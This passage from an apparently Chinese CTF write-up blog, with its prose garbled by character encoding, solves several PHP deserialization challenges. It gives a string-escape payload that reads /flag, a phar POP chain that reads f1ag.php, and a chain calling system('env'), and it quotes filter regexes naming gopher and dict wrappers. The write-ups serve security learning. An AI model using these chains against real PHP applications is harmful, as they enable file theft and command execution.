&#125;<br>&#125;<br><br><span class="hljs-variable">$person</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;John Doe&quot;</span>, <span class="hljs-number">25</span>);<br><br><span class="hljs-variable">$vars</span> = <span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-variable">$person</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$vars</span>);<br><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [name] =&gt; John Doe<br>    [age] =&gt; <span class="hljs-number">25</span><br>)<br><br></code></pre></td></tr></table></figure><p>æœ€åçš„é‚£ä¸ªifåˆ¤æ–­å°±æ˜¯å¦‚æœphoneæ˜¯ä¸€ä¸ªæ•°ç»„çš„è¯ï¼Œå°±æŠŠä»¥emailä¸ºè·¯å¾„çš„æ–‡ä»¶å†…å®¹ç»™è¯»å–å¹¶ä»¥å­—ç¬¦ä¸²çš„å½¢å¼ç»™æ‰“å°å‡ºæ¥</p><p>æœ€åæŠŠå†…å®¹è¿›è¡Œä¸€ä¸ªbase64åŠ å¯†</p><p>åˆ†æå®Œåæˆ‘ä»¬é€šè¿‡å­—ç¬¦ä¸²é€ƒé€¸çš„æ–¹å¼ï¼Œå°†emailçš„å€¼è®¾ä¸º/flagï¼Œç„¶åæŠŠå®ƒç»™æ”¾åˆ°nameé‡Œé¢å»ï¼Œè®©å®ƒå˜æˆä¸€ä¸ªnameçš„å€¼</p><p>è¿™æ ·å°±ç»•è¿‡äº†å¯¹emailçš„ä¸€ä¸ªæ£€æµ‹</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹ç®€å•çš„ä¸€ä¸ªæµ‹è¯•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">escape</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;Nq&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;aa&#x27;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;escape&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;Nq&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦åšçš„å°±æ˜¯å°†â€;s:5:â€phoneâ€;a:1:{i:0;s:2:â€aaâ€;}s:5:â€emailâ€;s:5:â€/flagâ€;}è¿™ä¸ªç»™å˜æˆnameçš„ä¸€ä¸ªå€¼</p><p>å­—ç¬¦ä¸²é€ƒé€¸çš„è¯å¯ä»¥å»çœ‹çœ‹æˆ‘çš„è¿™ç¯‡åšå®¢ ï¼ˆåˆå­¦è€…ï¼Œæ˜¯è‡ªå·±å¯¹ååºåˆ—åŒ–é€ƒé€¸çš„ä¸€ä¸ªç†è§£ï¼‰</p><p>ä¸Šé¢æˆ‘ä»¬è¦å¡è¿›å»çš„æœ‰58ä¸ªå­—ç¬¦ï¼Œæœ‰ä¸€ç‚¹ç‚¹é•¿å•Š</p><p>ä¸€ä¸ªNSSå¯ä»¥é€ƒé€¸å‡º3ä¸ªå­—ç¬¦ï¼Œæ ¹æ®è®¡ç®—æˆ‘ä»¬è¦19ä¸ªNSSåŠ ä¸€ä¸ªhello</p><p>nameçš„å€¼å°±æ˜¯ï¼š<br>name=NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSShelloâ€;s:5:â€phoneâ€;a:1:{i:0;s:2:â€aaâ€;}s:5:â€emailâ€;s:5:â€/flagâ€;}</p><p>ç„¶åphponeçš„å€¼éšä¾¿è¾“å°±è¡Œï¼Œæ³¨æ„çš„æ˜¯emialçš„å€¼ä¸èƒ½æ˜¯/flagï¼Œå…¶ä»–çš„éƒ½å¯ä»¥</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558491.png" alt="image-20230625162958674"></p><h1 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="[SWPU 2018]SimplePHP"></a>[SWPU 2018]SimplePHP</h1><p>è¿™ä¸ªé¢˜ç›®çš„è¯ä½¿ç”¨åˆ°äº†pharååºåˆ—åŒ– æ€»ä½“æ€è·¯å°±æ˜¯æ„é€ popé“¾ï¼Œç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Œç”±äºåšäº†ä¸€ä¸ªç™½åå•é™åˆ¶ï¼Œä½†æ˜¯åˆ©ç”¨pharä¼ªåè®®å»è¯»å–çš„æ—¶å€™ä¸åç¼€åæ— å…³ï¼Œå…³é”®æ˜¯é‡Œé¢çš„æ•°æ®è¦å¯¹</p><p>æ‰€ä»¥å°±æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹åç¼€åå°±å¯ä»¥äº† ä¸Šä¼ æ–‡ä»¶ åœ¨uploadä¸‹æŸ¥çœ‹ä¸€ä¸‹ </p><p>çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶å åœ¨æŸ¥çœ‹æ–‡ä»¶é‚£é‡Œè¯»å–ä¸€ä¸‹å°±å¯ä»¥äº†</p><p>é‡ç‚¹æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªpopé“¾æ„é€  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆå¤§æ¦‚çœ‹ä¸€éï¼Œç„¶åå‘ç°äº†file_get_contents()è¿™ä¸ªå‡½æ•°  è¯»å–æŒ‡å®šè·¯å¾„ä¸‹æ–‡ä»¶çš„å†…å®¹</p><p>file_get_()â€”â€”&gt;getâ€”â€”&gt; _geté­”æœ¯æ–¹æ³• â€”â€”&gt;tostringâ€”â€”&gt;ä¸Šé¢é‚£ä¸ªç±»çš„echo</p><p>popé“¾å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>]=<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="HZNUCTF-2023-preliminary-ppppopå·²è§£å†³"><a href="#HZNUCTF-2023-preliminary-ppppopå·²è§£å†³" class="headerlink" title="[HZNUCTF 2023 preliminary]ppppopå·²è§£å†³"></a>[HZNUCTF 2023 preliminary]ppppopå·²è§£å†³</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkUser</span>()) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]));<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>è¿™ä¸€é¢˜çš„è¯è·Ÿå­¦æ ¡æ–°ç”Ÿèµ›æœ‰ä¸€é“é¢˜å¾ˆåƒ æˆ‘æ„Ÿè§‰å‡ºå¤„å°±æ˜¯è¿™é‡Œ</p><p>å°±æ˜¯è¿›è¡Œä¸€ä¸ªcookieèº«ä»½éªŒè¯ ç„¶åå¯ä»¥å¾—åˆ°ä»£ç </p><p>è¿™ä¸ªä»£ç ç›¸å¯¹æ¥è¯´è¾ƒä¸ºç®€å•</p><p>è®©classNameä¸ºB å¯ä»¥è§¦å‘callé­”æœ¯æ–¹æ³• ç„¶åä¸‹é¢å°±æ˜¯è¿›è¡Œä¸€ä¸ªå‘½ä»¤æ‰§è¡Œ è¯»å–ç¯å¢ƒå˜é‡ env å°±å¯ä»¥å¾—åˆ°flag å¦åˆ™çš„è¯çš„å»å…¶ä»–ç›®å½•ä¸‹é¢å¯»æ‰¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$a</span>-&gt;className=<span class="hljs-string">&#x27;B&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;funcName=<span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;args=<span class="hljs-string">&#x27;env&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="UUCTF-2022-æ–°ç”Ÿèµ›-ez-unser"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ez-unser" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ez_unser"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ez_unser</h1><p>ä¸‹é¢æ¥çœ‹ä¸€ä¸‹åˆ©ç”¨å¼•ç”¨ç»•è¿‡wakeup</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">###very___so___easy!!!!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-number">1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c=<span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ è¾“å…¥çš„ä¸æ­£ç¡®ï¼ï¼ï¼æä»€ä¹ˆï¼ï¼&quot;</span>);<br>&#125;<br><span class="hljs-variable">$bbb</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>ä½ è¾“å…¥çš„ä¸æ­£ç¡®ï¼ï¼ï¼æä»€ä¹ˆï¼ï¼<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªçš„è¯åœ¨wakeupè¿™é‡Œä¼šå°†aèµ‹ä¸ºä¸€ä¸ªç©ºå€¼ ç„¶åè¿™æ 